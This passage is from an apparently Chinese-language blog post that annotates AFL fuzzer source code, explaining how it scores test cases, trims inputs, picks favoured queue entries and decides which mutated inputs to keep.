(q-&gt;handicap &gt;= <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    perf_score *= <span class="number">4</span>;</span><br><span class="line">    q-&gt;handicap -= <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;handicap) &#123;</span><br><span class="line"></span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">    q-&gt;handicap--;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Final adjustment based on input depth, under the assumption that fuzzing</span></span><br><span class="line"><span class="comment">     deeper test cases is more likely to reveal stuff that can&#x27;t be</span></span><br><span class="line"><span class="comment">     discovered with traditional fuzzers. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (q-&gt;depth) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> ... <span class="number">3</span>:   <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span> ... <span class="number">7</span>:   perf_score *= <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span> ... <span class="number">13</span>:  perf_score *= <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14</span> ... <span class="number">25</span>: perf_score *= <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:        perf_score *= <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that we don&#x27;t go over limit. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (perf_score &gt; HAVOC_MAX_MULT * <span class="number">100</span>) perf_score = HAVOC_MAX_MULT * <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> perf_score;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>从打分的规则来看（分数越高越好），我们可以看到执行速度越快、发现路径的数量越多、最近发现新路径的以及发现的路径越深的则分数更高。这里分数越高的测试用例在之后的随机变异也就是<code>RANDOM HAVOC</code> 阶段将会执行变异越多的轮次。也就是分数越高的随机变异的机会就越多。</p><h3 id="变异"><a href="#变异" class="headerlink" title="变异"></a>变异</h3><p>这里之所以代码这么长，大部分的代码都是集中在这个变异策略上。这里一共存在六种变异的策略。这里不同变异策略的详细实现还没有进行分析</p><ol><li>SIMPLE BITFLIP</li><li>ARITHMETIC INC/DEC</li><li>INTERESTING VALUES</li><li>DICTIONARY STUFF</li><li>RANDOM HAVOC</li><li>SPLICING</li></ol><p>这里在执行完毕每一次的变异策略之后都会调用<code>common_fuzz_stuff</code> 函数来将变异之后的样本投递到目标程序当中。并对结果进行一个评估。</p><h2 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h2><p>这里只是一个简单的方法进行剪枝的操作。</p><ul><li>trim_case源码  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Trim all new test cases to save cycles when doing deterministic checks. The</span></span><br><span class="line"><span class="comment">   trimmer uses power-of-two increments somewhere between 1/16 and 1/1024 of</span></span><br><span class="line"><span class="comment">   file size, to keep the stage short and sweet. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">trim_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* in_buf)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">64</span>];</span><br><span class="line">  <span class="type">static</span> u8 clean_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  needs_write = <span class="number">0</span>, fault = <span class="number">0</span>;</span><br><span class="line">  u32 trim_exec = <span class="number">0</span>;</span><br><span class="line">  u32 remove_len;</span><br><span class="line">  u32 len_p2;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although the trimmer will be less useful when variable behavior is</span></span><br><span class="line"><span class="comment">     detected, it will still work to some extent, so we don&#x27;t check for</span></span><br><span class="line"><span class="comment">     this. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;len &lt; <span class="number">5</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  stage_name = tmp;</span><br><span class="line">  bytes_trim_in += q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Select initial chunk len, starting with large steps. */</span></span><br><span class="line"></span><br><span class="line">  len_p2 = <span class="built_in">next_p2</span>(q-&gt;len); <span class="comment">// 获取最接近的2^n 的n值</span></span><br><span class="line"></span><br><span class="line">  remove_len = <span class="built_in">MAX</span>(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES); <span class="comment">// 16  4 也就是这里最大值是4字节或者文件大小的1/4</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Continue until the number of steps gets too high or the stepover</span></span><br><span class="line"><span class="comment">     gets too small. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (remove_len &gt;= <span class="built_in">MAX</span>(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES)) &#123;</span><br><span class="line"></span><br><span class="line">    u32 remove_pos = remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;trim %s/%s&quot;</span>, <span class="built_in">DI</span>(remove_len), <span class="built_in">DI</span>(remove_len));</span><br><span class="line"></span><br><span class="line">    stage_cur = <span class="number">0</span>;</span><br><span class="line">    stage_max = q-&gt;len / remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (remove_pos &lt; q-&gt;len) &#123;</span><br><span class="line"></span><br><span class="line">      u32 trim_avail = <span class="built_in">MIN</span>(remove_len, q-&gt;len - remove_pos);</span><br><span class="line">      u32 cksum;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">write_with_gap</span>(in_buf, q-&gt;len, remove_pos, trim_avail); <span class="comment">// 将removs_pos开启长度为trim_avail的内容跳过，其余部分写入到out_fd中</span></span><br><span class="line"></span><br><span class="line">      fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line">      trim_execs++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stop_soon || fault == FAULT_ERROR) <span class="keyword">goto</span> abort_trimming;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Note that we don&#x27;t keep track of crashes or hangs here; maybe TODO? */</span></span><br><span class="line"></span><br><span class="line">      cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the deletion had no impact on the trace, make it permanent. This</span></span><br><span class="line"><span class="comment">         isn&#x27;t perfect for variable-path inputs, but we&#x27;re just making a</span></span><br><span class="line"><span class="comment">         best-effort pass, so it&#x27;s not a big deal if we end up with false</span></span><br><span class="line"><span class="comment">         negatives every now and then. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cksum == q-&gt;exec_cksum) &#123; <span class="comment">// 如果对路径没有影响，那么这里即删除这部分内容</span></span><br><span class="line"></span><br><span class="line">        u32 move_tail = q-&gt;len - remove_pos - trim_avail;</span><br><span class="line"></span><br><span class="line">        q-&gt;len -= trim_avail;</span><br><span class="line">        len_p2  = <span class="built_in">next_p2</span>(q-&gt;len);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memmove</span>(in_buf + remove_pos, in_buf + remove_pos + trim_avail, </span><br><span class="line">                move_tail);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Let&#x27;s save a clean trace, which will be needed by</span></span><br><span class="line"><span class="comment">           update_bitmap_score once we&#x27;re done with the trimming stuff. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!needs_write) &#123;</span><br><span class="line"></span><br><span class="line">          needs_write = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(clean_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> remove_pos += remove_len;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Since this can be slow, update the screen every now and then. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!(trim_exec++ % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line">      stage_cur++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_len &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have made changes to in_buf, we also need to update the on-disk</span></span><br><span class="line"><span class="comment">     version of the test case. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (needs_write) &#123;</span><br><span class="line"></span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">unlink</span>(q-&gt;fname); <span class="comment">/* ignore errors */</span></span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(q-&gt;fname, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_write</span>(fd, in_buf, q-&gt;len, q-&gt;fname);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(trace_bits, clean_trace, MAP_SIZE);</span><br><span class="line">    <span class="built_in">update_bitmap_score</span>(q);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">abort_trimming:</span><br><span class="line"></span><br><span class="line">  bytes_trim_out += q-&gt;len;</span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里只对大文件进行剪枝操作，小于5字节大小的文件不会执行剪枝操作。这里首先是设置了一个大步即一开始的<code>remove_len</code> 按照这个长度划分文件为一个个的块，依次尝试删除这个块，如果删除之后对文件执行之后的路径没有任何影响的话，那么就将这种删除进行保留。所有的块遍历结束之后这里将<code>remove_len&gt;&gt;1</code></p><p>如果文件内容发生了改变，那么这里就将更改之后的文件写入到磁盘中，并且这里会更新起相应的<code>trace_bits</code> 及其对应的分数。</p><h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>该函数的主要作用就是找出一个测试用例，该测试用例对于某组路径触发的消耗最小。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* When we bump into a new path, we call this to see if the path appears</span></span><br><span class="line"><span class="comment">   more &quot;favorable&quot; than any of the existing ones. The purpose of the</span></span><br><span class="line"><span class="comment">   &quot;favorables&quot; is to have a minimal set of paths that trigger all the bits</span></span><br><span class="line"><span class="comment">   seen in the bitmap so far, and focus on fuzzing them at the expense of</span></span><br><span class="line"><span class="comment">   the rest.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The first step of the process is to maintain a list of top_rated[] entries</span></span><br><span class="line"><span class="comment">   for every byte in the bitmap. We win that slot if there is no previous</span></span><br><span class="line"><span class="comment">   contender, or if the contender has a more favorable speed x size factor. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">update_bitmap_score</span><span class="params">(<span class="keyword">struct</span> queue_entry* q)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line">  u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For every byte set in trace_bits[], see if there is a previous winner,</span></span><br><span class="line"><span class="comment">     and how it compares to us. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (top_rated[i]) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Faster-executing or smaller test cases are favored. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Looks like we&#x27;re going to win. Decrease ref count for the</span></span><br><span class="line"><span class="comment">            previous winner, discard its trace_bits[] if necessary. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;</span><br><span class="line">           <span class="built_in">ck_free</span>(top_rated[i]-&gt;trace_mini);</span><br><span class="line">           top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Insert ourselves as the new winner. */</span></span><br><span class="line"></span><br><span class="line">       top_rated[i] = q;</span><br><span class="line">       q-&gt;tc_ref++;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">         q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">         <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       score_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的做法就是对于给定的测试用例，依次按照bytes遍历其<code>trace_bits</code> ，如果之前对于当前路径有一个最优的测试用例，那么这里就会进行性能比较，涉及到两个元素也就是执行时间以及文件大小，如果当前的测试用例更优的话，那么就更新<code>top_rated</code> 元组中的数据，表示对于这组路径来说当前的测试用例的开销是最小的。</p><p>这里实际上反映的是AFL的优胜者策略，也就是执行时间越短、文件大小越小的测试用例对于当前的元组来说就是一个优胜者，这里<code>tc_ref</code>成员变量表示的是当前的测试用例被认为是优胜者的次数。如果是优胜者那么就会将其trace_bits进行压缩，只保留命中信息而去掉命中次数的信息，也就是<code>trace_mini</code> 。</p><h2 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h2><p>该函数在每一次变异结束之后都会被调用用来执行变异之后的测试用例。我们看一下这个函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Write a modified test case, run program, process results. Handle</span></span><br><span class="line"><span class="comment">   error conditions, returning 1 if it&#x27;s time to bail out. This is</span></span><br><span class="line"><span class="comment">   a helper function for fuzz_one(). */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST u8 <span class="title">common_fuzz_stuff</span><span class="params">(<span class="type">char</span>** argv, u8* out_buf, u32 len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 fault;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (post_handler) &#123;</span><br><span class="line"></span><br><span class="line">    out_buf = <span class="built_in">post_handler</span>(out_buf, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (!out_buf || !len) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_to_testcase</span>(out_buf, len);</span><br><span class="line"></span><br><span class="line">  fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fault == FAULT_TMOUT) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subseq_tmouts++ &gt; TMOUT_LIMIT) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> subseq_tmouts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Users can hit us with SIGUSR1 to request the current input</span></span><br><span class="line"><span class="comment">     to be abandoned. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_requested) &#123;</span><br><span class="line"></span><br><span class="line">     skip_requested = <span class="number">0</span>;</span><br><span class="line">     cur_skipped_paths++;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This handles FAULT_ERROR for us: */</span></span><br><span class="line"></span><br><span class="line">  queued_discovered += <span class="built_in">save_if_interesting</span>(argv, out_buf, len, fault);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(stage_cur % stats_update_freq) || stage_cur + <span class="number">1</span> == stage_max)</span><br><span class="line">    <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的这个<code>post_handler</code> 函数不知道是做什么的。这里首先会调用<code>write_to_testcase</code> 函数来将测试用例写入到磁盘文件中。接着调用<code>run_target</code> 函数来启动目标程序执行这个测试用例。</p><p>测试用例执行完毕中之后，这里会调用<code>save_if_interesting</code> 函数来决定是否保存当前的这个变异之后的测试用例。</p><h2 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h2><p>该函数就是用来决定是否保存输入的测试用例的，在变异之后的样本测试中会触发调用。我们来看一下这个函数。</p><ul><li><code>save_if_interesting</code> 函数源码  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if the result of an execve() during routine fuzzing is interesting,</span></span><br><span class="line"><span class="comment">   save or queue the input test case for further analysis if so. Returns 1 if</span></span><br><span class="line"><span class="comment">   entry is saved, 0 otherwise. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">save_if_interesting</span><span class="params">(<span class="type">char</span>** argv, <span class="type">void</span>* mem, u32 len, u8 fault)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8  *fn = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  u8  hnb;</span><br><span class="line">  s32 fd;</span><br><span class="line">  u8  keeping = <span class="number">0</span>, res;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fault == crash_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Keep only if there are new bits in the map, add to queue for</span></span><br><span class="line"><span class="comment">       future fuzzing, etc. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hnb = <span class="built_in">has_new_bits</span>(virgin_bits))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (crash_mode) total_crashes++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line"></span><br><span class="line">    fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue/id:%06u,%s&quot;</span>, out_dir, queued_paths,</span><br><span class="line">                      <span class="built_in">describe_op</span>(hnb));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue/id_%06u&quot;</span>, out_dir, queued_paths);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!SIMPLE_FILES */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hnb == <span class="number">2</span>) &#123;</span><br><span class="line">      queue_top-&gt;has_new_cov = <span class="number">1</span>;</span><br><span class="line">      queued_with_cov++;</span><br><span class="line">    